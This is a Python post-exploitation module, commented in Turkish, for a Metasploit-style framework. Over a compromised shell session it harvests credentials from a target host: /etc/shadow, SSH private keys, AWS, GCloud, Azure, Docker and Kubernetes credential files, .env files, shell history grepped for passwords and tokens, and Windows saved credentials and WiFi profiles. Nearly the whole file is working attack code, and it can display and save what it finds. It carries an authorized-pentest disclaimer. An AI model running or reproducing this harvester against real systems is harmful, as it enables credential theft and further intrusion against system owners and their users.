# =============================================================================
# Post-Exploitation: Penelope Tarzı Uzak Credential Harvester
# =============================================================================
# Aktif shell oturumu üzerinden hedef sistemdeki kimlik bilgisi dosyalarını
# tarayan ve bulunan hassas verileri raporlayan modül.
#
# KULLANIM:
#   use post/gather/remote_creds
#   set SESSION 1
#   set SECTIONS all
#   run
#
# Bu modül tamamen etik siber güvenlik ve yetkili penetrasyon testi
# amaçlıdır. Yalnızca yazılı izin alınmış sistemlerde kullanılmalıdır.
# =============================================================================

from __future__ import annotations

from typing import Any

from rich.console import Console
from rich.panel import Panel
from rich.table import Table

from core import logger, shell_exec
from core.module import BaseModule
from core.option import Option
from core.shared_state import shared_state

# ── Taranacak dosya desenleri ─────────────────────────────────────────────────

_UNIX_CRED_FILES: list[dict[str, str]] = [
    {"path": "/etc/shadow", "desc": "Parola hash'leri", "cat": "passwords"},
    {"path": "/etc/passwd", "desc": "Kullanıcı hesapları", "cat": "passwords"},
    {"path": "~/.bash_history", "desc": "Bash komut geçmişi", "cat": "history"},
    {"path": "~/.zsh_history", "desc": "Zsh komut geçmişi", "cat": "history"},
    {"path": "~/.ssh/id_rsa", "desc": "SSH özel anahtar (RSA)", "cat": "ssh"},
    {"path": "~/.ssh/id_ed25519", "desc": "SSH özel anahtar (Ed25519)", "cat": "ssh"},
    {"path": "~/.ssh/authorized_keys", "desc": "Yetkili SSH anahtarları", "cat": "ssh"},
    {"path": "~/.ssh/known_hosts", "desc": "Bilinen SSH sunucuları", "cat": "ssh"},
    {"path": "~/.ssh/config", "desc": "SSH yapılandırması", "cat": "ssh"},
    {"path": "~/.netrc", "desc": "FTP/HTTP kimlik bilgileri", "cat": "passwords"},
    {"path": "~/.pgpass", "desc": "PostgreSQL parolası", "cat": "passwords"},
    {"path": "~/.my.cnf", "desc": "MySQL istemci yapılandırması", "cat": "passwords"},
    {"path": "~/.aws/credentials", "desc": "AWS erişim anahtarları", "cat": "cloud"},
    {"path": "~/.aws/config", "desc": "AWS yapılandırması", "cat": "cloud"},
    {"path": "~/.config/gcloud/credentials.db", "desc": "GCloud kimlik bilgileri", "cat": "cloud"},
    {"path": "~/.azure/accessTokens.json", "desc": "Azure erişim token'ları", "cat": "cloud"},
    {"path": "~/.docker/config.json", "desc": "Docker registry bilgileri", "cat": "cloud"},
    {"path": "~/.git-credentials", "desc": "Git kimlik bilgileri", "cat": "passwords"},
    {"path": "~/.gitconfig", "desc": "Git yapılandırması", "cat": "passwords"},
    {"path": "~/.kube/config", "desc": "Kubernetes yapılandırması", "cat": "cloud"},
]

_WINDOWS_CRED_CHECKS: list[dict[str, str]] = [
    {"cmd": "cmdkey /list", "desc": "Kayıtlı kimlik bilgileri", "cat": "passwords"},
    {"cmd": "netsh wlan show profiles", "desc": "WiFi profilleri", "cat": "passwords"},
    {"cmd": "reg query HKCU\\Software\\SimonTatham\\PuTTY\\Sessions", "desc": "PuTTY oturumları", "cat": "ssh"},
    {"cmd": "dir /s /b %USERPROFILE%\\.ssh\\*", "desc": "SSH dosyaları", "cat": "ssh"},
    {"cmd": "type %USERPROFILE%\\.gitconfig 2>nul", "desc": "Git yapılandırması", "cat": "passwords"},
    {"cmd": "type %USERPROFILE%\\.aws\\credentials 2>nul", "desc": "AWS kimlik bilgileri", "cat": "cloud"},
]

# Geçmiş dosyalarda aranacak hassas kelime desenleri
_SENSITIVE_PATTERNS = [
    "password", "passwd", "secret", "token", "api_key", "apikey",
    "access_key", "aws_secret", "private_key", "authorization",
    "mysql -u", "psql -U", "sshpass", "curl.*-u ",
]


class RemoteCreds(BaseModule):
    """
    Penelope Tarzı Uzak Credential Harvester.

    Shell oturumu üzerinden hedef sistemdeki hassas dosyaları tarar.
    """

    Name = "Remote Credential Harvester"
    Description = (
        "Aktif shell oturumu üzerinden hedef sistemdeki kimlik bilgisi dosyalarını tarar"
    )
    Author = "Mahmut P."
    Category = "post/gather"
    Version = "1.0"

    def __init__(self) -> None:
        super().__init__()
        self.Options = {
            "SESSION": Option("SESSION", "", True, "Hedef oturum ID'si."),
            "SECTIONS": Option(
                "SECTIONS", "all", False,
                "Taranacak bölümler: passwords,ssh,cloud,history,env,all",
                choices=["all", "passwords", "ssh", "cloud", "history", "env"],
            ),
            "SHOW_CONTENT": Option(
                "SHOW_CONTENT", "false", False,
                "Bulunan dosyaların içeriğini göster (true/false).",
                choices=["true", "false"],
            ),
            "PREVIEW_LINES": Option(
                "PREVIEW_LINES", 5, False,
                "Gösterilecek satır sayısı.",
            ),
            "LOOT_DIR": Option(
                "LOOT_DIR", "", False,
                "Bulunan dosyaları kaydet (dizin yolu).",
                completion_dir=".",
            ),
            "TIMEOUT": Option(
                "TIMEOUT", 10, False,
                "Komut zaman aşımı (saniye).",
            ),
        }
        self.console = Console()

    # ─── Socket üzerinden komut çalıştırma ──────────────────────────────

    @staticmethod
    def _exec_on_session(sock: Any, command: str, timeout: float = 10.0) -> str:
        """Shell oturumuna komut gönderir ve marker tabanlı çıktıyı yakalar.

        Protokolün tek uygulaması core/shell_exec.py'de: PTY prompt'u ve
        terminal echo'su temizlenir, hata durumunda "[Hata: ...]" döner.
        """
        return shell_exec.exec_on_session(sock, command, timeout)

    def _detect_os(self, sock: Any, timeout: float) -> str:
        """Uzak OS'u algılar."""
        result = self._exec_on_session(sock, "uname -s", timeout=timeout)
        if "linux" in result.lower():
            return "linux"
        if "darwin" in result.lower():
            return "macos"
        win = self._exec_on_session(sock, "echo %OS%", timeout=timeout)
        if "windows" in win.lower():
            return "windows"
        return "linux"

    # ─── Unix dosya tarama ──────────────────────────────────────────────

    def _scan_unix_files(
        self, sock: Any, sections: set, timeout: float,
        show_content: bool, preview_lines: int,
    ) -> list[dict]:
        """Unix/macOS'ta bilinen credential dosyalarını tarar."""
        results: list[dict] = []

        for entry in _UNIX_CRED_FILES:
            if "all" not in sections and entry["cat"] not in sections:
                continue

            path = entry["path"]
            # ~ genişletmesini uzak tarafta yap
            check = self._exec_on_session(
                sock,
                f'eval path={path} && test -f "$path" && stat -c"%s" "$path" 2>/dev/null '
                f'|| test -f "$path" && wc -c < "$path" 2>/dev/null '
                f'|| echo NOTFOUND',
                timeout=timeout,
            )

            if "NOTFOUND" in check:
                results.append({
                    "path": path, "desc": entry["desc"], "cat": entry["cat"],
                    "exists": False, "size": 0, "content": "",
                })
                continue

            try:
                size = int(check.strip().split("\n")[-1].strip())
            except (ValueError, IndexError):
                size = -1

            content = ""
            if show_content:
                content = self._exec_on_session(
                    sock,
                    f'eval path={path} && head -n {preview_lines} "$path"',
                    timeout=timeout,
                )

            results.append({
                "path": path, "desc": entry["desc"], "cat": entry["cat"],
                "exists": True, "size": size, "content": content,
            })

        return results

    # ─── .env dosya tarama ──────────────────────────────────────────────

    def _scan_env_files(self, sock: Any, timeout: float) -> list[str]:
        """Yaygın dizinlerde .env dosyalarını arar."""
        result = self._exec_on_session(
            sock,
            'find /var/www /opt /home /srv /root '
            '-maxdepth 4 -name ".env" -type f 2>/dev/null | head -20',
            timeout=min(timeout, 15),
        )
        if result and "[Hata" not in result:
            return [line.strip() for line in result.split("\n") if line.strip()]
        return []

    # ─── Geçmiş dosyalarda hassas pattern arama ─────────────────────────

    def _scan_history_patterns(
        self, sock: Any, timeout: float,
    ) -> list[dict]:
        """Bash/Zsh geçmişinde hassas anahtar kelimeleri arar."""
        findings: list[dict] = []
        patterns_grep = "\\|".join(_SENSITIVE_PATTERNS)

        for hist_file in ["~/.bash_history", "~/.zsh_history"]:
            result = self._exec_on_session(
                sock,
                f'eval path={hist_file} && '
                f'grep -in "{patterns_grep}" "$path" 2>/dev/null | tail -15',
                timeout=timeout,
            )
            if result and "[Hata" not in result and result.strip():
                findings.append({
                    "file": hist_file,
                    "matches": result,
                })

        return findings

    # ─── Windows tarama ─────────────────────────────────────────────────

    def _scan_windows(
        self, sock: Any, sections: set, timeout: float,
    ) -> list[dict]:
        """Windows'ta credential bilgilerini toplar."""
        results: list[dict] = []

        for entry in _WINDOWS_CRED_CHECKS:
            if "all" not in sections and entry["cat"] not in sections:
                continue

            output = self._exec_on_session(sock, entry["cmd"], timeout=timeout)
            results.append({
                "desc": entry["desc"],
                "cat": entry["cat"],
                "output": output if output and "[Hata" not in output else "",
            })

        return results

    # ─── Görüntüleme ───────────────────────────────────────────────────────

    def _display_unix_results(self, results: list[dict], show_content: bool) -> int:
        """Unix tarama sonuçlarını tablo olarak görüntüler."""
        found = sum(1 for r in results if r["exists"])

        tbl = Table(title="📂 Hassas Dosya Taraması", border_style="red", expand=True)
        tbl.add_column("Durum", justify="center", width=6)
        tbl.add_column("Dosya", style="white", max_width=45)
        tbl.add_column("Açıklama", style="dim")
        tbl.add_column("Boyut", justify="right")
        tbl.add_column("Kategori", style="cyan")

        for r in results:
            if r["exists"]:
                status = "[green]✔[/green]"
                size_str = (
                    f"{r['size']:,} B" if r["size"] >= 0 else "?"
                )
            else:
                status = "[dim]✘[/dim]"
                size_str = "—"
            tbl.add_row(status, r["path"], r["desc"], size_str, r["cat"])

        self.console.print(tbl)
        self.console.print(f"  [bold]Bulunan:[/bold] [green]{found}[/green] / {len(results)}")
        self.console.print()

        # İçerik gösterimi
        if show_content:
            for r in results:
                if r["exists"] and r.get("content"):
                    self.console.print(Panel(
                        r["content"],
                        title=f"[cyan]{r['path']}[/cyan]",
                        border_style="yellow",
                        expand=False,
                    ))
            self.console.print()

        return found

    # ─── Ana Çalıştırma ────────────────────────────────────────────────────

    def run(self, options: dict[str, Any]) -> bool:
        """Shell oturumu üzerinden credential taraması yapar."""
        session_id_raw = options.get("SESSION", "")
        if not session_id_raw or str(session_id_raw).strip() == "":
            self.console.print("[bold red][!] SESSION belirtilmedi.[/bold red]")
            return False

        try:
            session_id = int(str(session_id_raw).strip())
        except ValueError:
            self.console.print(f"[bold red][!] Geçersiz SESSION: {session_id_raw}[/bold red]")
            return False

        sections_raw = str(options.get("SECTIONS", "all")).lower().strip()
        sections = (
            {"all"}
            if sections_raw == "all"
            else set(s.strip() for s in sections_raw.split(","))
        )
        show_content = str(options.get("SHOW_CONTENT", "false")).lower() == "true"
        preview_lines = int(options.get("PREVIEW_LINES", 5))
        timeout = float(options.get("TIMEOUT", 10))

        # Oturumu bul
        if not shared_state.session_manager:
            self.console.print("[bold red][!] Session manager başlatılmamış.[/bold red]")
            return False

        session = shared_state.session_manager.get_session(session_id)
        if not session:
            self.console.print(f"[bold red][!] Session {session_id} bulunamadı.[/bold red]")
            return False

        handler = session.get("handler")
        if not handler:
            self.console.print(f"[bold red][!] Session {session_id}: handler yok.[/bold red]")
            return False

        sock = None
        if hasattr(handler, "resolve_client_sock"):
            sock = handler.resolve_client_sock(session_id)
        if not sock:
            sock = getattr(handler, "client_sock", None)
        if not sock:
            self.console.print(f"[bold red][!] Session {session_id}: aktif soket yok.[/bold red]")
            return False

        logger.info(f"Remote cred taraması başlatılıyor (Session {session_id})")

        # PTY oturumlarda echo'yu kapat: readline uzun satırlari yeniden
        # cizer ve marker'lari bozar (cikti "[Hata: komut tamamlanmadi]" olur).
        shell_exec.prepare_remote(
            sock, min(timeout, 10),
            warn=lambda: self.console.print(
                "[yellow][!] Terminal echo'su kapatilamadi; "
                "uzak oturumda bazi ciktilar eksik gelebilir.[/yellow]"
            ),
        )

        # OS algıla
        target_os = self._detect_os(sock, min(timeout, 10))
        os_label = {"linux": "🐧 Linux", "macos": "🍎 macOS", "windows": "🪟 Windows"}.get(
            target_os, target_os
        )

        self.console.print()
        self.console.print(Panel.fit(
            f"[bold cyan]🔑 KİMLİK BİLGİSİ TARAMASI — Session {session_id}[/bold cyan]\n"
            f"[dim]OS: {os_label} | Penelope tarzı shell-over-socket[/dim]",
            border_style="cyan",
        ))

        total_found = 0

        if target_os in ("linux", "macos"):
            # 1. Bilinen dosya taraması
            self.console.print("[cyan][*] Bilinen credential dosyaları taranıyor...[/cyan]")
            results = self._scan_unix_files(sock, sections, timeout, show_content, preview_lines)
            total_found += self._display_unix_results(results, show_content)

            # 2. .env dosya taraması
            if "all" in sections or "env" in sections:
                self.console.print("[cyan][*] .env dosyaları aranıyor...[/cyan]")
                env_files = self._scan_env_files(sock, timeout)
                if env_files:
                    tbl = Table(title="📄 Bulunan .env Dosyaları", border_style="yellow")
                    tbl.add_column("#", style="dim", justify="right")
                    tbl.add_column("Dosya Yolu", style="white")
                    for idx, fpath in enumerate(env_files, 1):
                        tbl.add_row(str(idx), fpath)
                    self.console.print(tbl)
                    total_found += len(env_files)
                else:
                    self.console.print("[dim]  .env dosyası bulunamadı.[/dim]")
                self.console.print()

            # 3. Geçmiş dosyalarında hassas pattern arama
            if "all" in sections or "history" in sections:
                self.console.print("[cyan][*] Komut geçmişi taranıyor...[/cyan]")
                history_findings = self._scan_history_patterns(sock, timeout)
                if history_findings:
                    for finding in history_findings:
                        self.console.print(Panel(
                            finding["matches"],
                            title=f"[cyan]🔍 {finding['file']}[/cyan] — Hassas eşleşmeler",
                            border_style="red",
                            expand=False,
                        ))
                    total_found += len(history_findings)
                else:
                    self.console.print("[dim]  Geçmişte hassas veri bulunamadı.[/dim]")
                self.console.print()

        elif target_os == "windows":
            self.console.print("[cyan][*] Windows credential bilgileri toplanıyor...[/cyan]")
            win_results = self._scan_windows(sock, sections, timeout)
            for r in win_results:
                if r["output"]:
                    self.console.print(Panel(
                        r["output"],
                        title=f"[cyan]{r['desc']}[/cyan]",
                        border_style="yellow",
                        expand=False,
                    ))
                    total_found += 1

        # Özet
        self.console.print(Panel.fit(
            f"[bold green]✓ Tarama tamamlandı — {total_found} bulgu[/bold green]",
            border_style="green",
        ))

        if shared_state.session_manager:
            shared_state.session_manager.update_session_activity(session_id)

        logger.info(f"Remote cred taraması tamamlandı ({total_found} bulgu)")
        return True
